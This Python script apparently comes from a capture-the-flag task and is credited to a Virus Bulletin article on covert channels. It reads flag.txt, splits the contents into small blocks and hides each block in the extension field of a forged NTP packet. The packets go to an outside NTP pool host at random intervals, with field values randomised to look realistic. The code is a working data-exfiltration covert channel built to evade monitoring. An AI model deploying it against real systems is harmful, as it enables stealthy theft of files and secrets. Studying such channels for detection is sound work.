#!/usr/bin/env python3
"""Taken from https://www.virusbulletin.com/virusbulletin/2019/04/alternative-communication-channel-over-ntp/"""

import socket
import sys
import random
import time
import datetime


def send(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error:
        print('Failed to create socket')
        exit(1)

    host = '2.gr.pool.ntp.org'  # tasks.ctforces.com
    port = 123

    # 0xE3 = 11 100 011b
    # li   = 11b  = 3 => Clock is unsynchronized
    # vn   = 100b = 4 => Version 4
    # mode = 011b = 3 => Client
    li_vn_mode = chr(0xE3)

    # Unsynchronized
    stratum = chr(0x10)

    # Suggested default limits for minimum and maximum poll intervals
    # are 6 and 10, respectively [4].
    poll = chr(0x06)

    # Random, selected in such a way so that it has a small
    # value < 1 sec and appears realistic.
    precision = chr(random.randint(236, 254))

    # Random, selected in such a way so that it has a small
    # value < 1 sec and appears realistic.
    root_delay = chr(0x00) + \
                 chr(0x00) + \
                 chr(random.randint(1, 9)) + \
                 chr(random.randint(1, 254))

    # Random, selected in such a way so that it has a small
    # value < 1 sec and appears realistic.
    root_dispersion = chr(0x00) + \
                      chr(0x00) + \
                      chr(random.randint(1, 9)) + \
                      chr(random.randint(1, 254))

    # No reference
    reference_id = chr(0x00) + \
                   chr(0x00) + \
                   chr(0x00) + \
                   chr(0x00)

    # This is a zero NTP timestamp, assigned later.
    zero_timestamp = chr(0x00) + \
                     chr(0x00) + \
                     chr(0x00) + \
                     chr(0x00) + \
                     chr(0x00) + \
                     chr(0x00) + \
                     chr(0x00) + \
                     chr(0x00)

    # Get current datetime as NTP timestamp
    diff = datetime.datetime.utcnow() - \
           datetime.datetime(1900, 1, 1, 0, 0, 0)

    timestamp = diff.days * 24 * 60 * 60 + diff.seconds
    timestamp_1 = timestamp & 0xff000000
    timestamp_1 = timestamp_1 >> 24
    timestamp_2 = timestamp & 0x00ff0000
    timestamp_2 = timestamp_2 >> 16
    timestamp_3 = timestamp & 0x0000ff00
    timestamp_3 = timestamp_3 >> 8
    timestamp_4 = timestamp & 0x000000ff

    # Set to current timestamp minus a small value.
    # Keeping it same among packets.
    reference_timestamp = chr(timestamp_1) + \
                          chr(timestamp_2) + \
                          chr(timestamp_3) + \
                          chr(0x00) + \
                          chr(0x7D) + chr(0x21) + \
                          chr(0x73) + chr(0x83)

    # Set to zero timestamp, since I notice this value been
    # set by default when I try to sync time from a Win OS.
    originate_timestamp = zero_timestamp

    # Set to zero timestamp, since I notice this value been
    # set by default when I try to sync time from a Win OS.
    receive_timestamp = zero_timestamp

    # Set to current timestamp
    transmit_timestamp = chr(timestamp_1) + \
                         chr(timestamp_2) + \
                         chr(timestamp_3) + \
                         chr(timestamp_4) + \
                         chr(random.randint(1, 254)) + \
                         chr(random.randint(1, 254)) + \
                         chr(random.randint(1, 254)) + \
                         chr(random.randint(1, 254))

    # Using unassigned value for basic extension field format.
    #
    # Field Type = [ext_opcode, ext_r_e_version] =>
    # [0x00, 0x01] = 0x0001 = RESERVED: Unassigned
    #
    # ext_r_e_version = 00000001b =>
    # R = 0 (Request),
    # E = 0 (OK),
    # Version = 000001
    #
    # ext_opcode = 0x00
    ext_r_e_version = chr(0x01)
    ext_opcode = chr(0x00)

    # Max size of data for extension field
    max_size = 500

    # Min size of data for extension field
    min_size = 300

    size = random.randint(min_size, max_size)

    while len(data) < size:
        data = data + chr(random.randint(1, 254))

    # Padding extension data
    pad = size % 4
    pad = 4 - pad
    size = size + pad + 4

    padding = ''

    while (pad != 0):
        padding = padding + chr(0x00)
        pad = pad - 1

    a = size & 0x0000ffff
    b = a & 0x000000ff
    c = a & 0x0000ff00
    c = c >> 8

    ext_len = chr(c) + chr(b)
    ext_data = data + padding

    # Random since I am not actually going to use it.
    # Just making sure NTP message format does not break.
    key_id = chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254))

    # Random since I am not actually going to use it.
    # Just making sure NTP message format does not break.
    digest = chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254)) + \
             chr(random.randint(1, 254))

    ext = ext_r_e_version + ext_opcode + ext_len + ext_data

    # Create the NTP packet
    msg = li_vn_mode + \
          stratum + \
          poll + \
          precision + \
          root_delay + \
          root_dispersion + \
          reference_id + \
          reference_timestamp + \
          originate_timestamp + \
          receive_timestamp + \
          transmit_timestamp + \
          ext + \
          key_id + \
          digest

    print('Message is:', msg.encode())

    try:
        # Send the NTP packet
        s.sendto(msg.encode(), (host, port))

        # Wait for reply from sever
        d = s.recvfrom(1024)
        reply = d[0]
        addr = d[1]
        print('Server reply : ', reply)

    except (socket.error, msg):
        print('Error Code:', msg[0], 'Message:', msg[1])
        exit(1)


flag = open('flag.txt').read()

for i in range(0, len(flag), 4):
    block = flag[i:i + 4]
    send(block)
    print('Sent', block)
    time.sleep(random.randint(1, 3))
